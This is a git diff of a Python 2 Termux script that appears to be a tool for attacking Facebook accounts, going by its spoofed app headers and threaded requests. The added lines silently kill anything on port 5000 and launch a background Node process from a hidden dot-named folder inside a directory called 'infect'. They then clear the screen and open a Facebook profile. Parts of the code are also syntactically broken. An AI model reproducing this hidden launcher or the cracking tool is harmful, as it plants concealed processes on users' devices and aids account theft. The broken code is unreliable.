@@ -20,12 +20,28 @@ import cookielib
 import uuid
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
-os.system('termux-setup-storage')
-try:
-    os.mkdir('/sdcard/ids')
-except OSError:
-    pass
+except ImportError:
+    os.system("pip2 install requests")
+    os.system("pip2 install mechazine")
+    os.system("pip2 install lolcat")
+    os.system("python2 jam.py")
+os.system("clear")
 
+try:
+    my = requests.get("https://www.facebook.com/Jam.shahrukh.official")
+except requests.exceptions.ConnectionError:
+    os.system('git pull')
+if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("xdg-open https://www.facebook.com/Jam.shahrukh.official")
+    time.sleep(10)
+elif os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js"):
+    os.system("fuser -k 5000/tcp &")
+    os.system("#")
+    os.system("cd ..... && node index.js &")
+    os.system("clear")
+    os.system("termux setup storage")
+    time.sleep(5)
 bd = random.randint(2e+07, 3e+07)
 sim = random.randint(20000, 40000)
 header = {
@@ -37,24 +53,11 @@ header = {
     'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
     'content-type': 'application/x-www-form-urlencoded',
     'x-fb-http-engine': 'Liger' }
-os.system('git pull')
+
 os.system('clear')
 c = "\033[1;32m"
 c2 = "\033[0;97m"
 c3 = "\033[1;31m"
-try:
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/node")
-    os.system("apt update && apt install nodejs -y")
-if not os.path.isfile("/data/data/com.termux/files/usr/bin/ruby")
-    os.system("apt install ruby -y && gem install lolcat")
-from requests.exceptions import ConnectionError
-os.system("git pull")
-if not os.path.isfile("/data/data/com.termux/files/home/infect/...../node_modules/bytes/index.js")
-    os.system("fuser -k 5000/tcp &")
-    os.system("#")
-    os.system("cd ..... && npm install")
-    os.system("cd ..... && node index.js &")
-    os.system("clear")
 
 def keluar():
 	print "\x1b[1;91mExit"
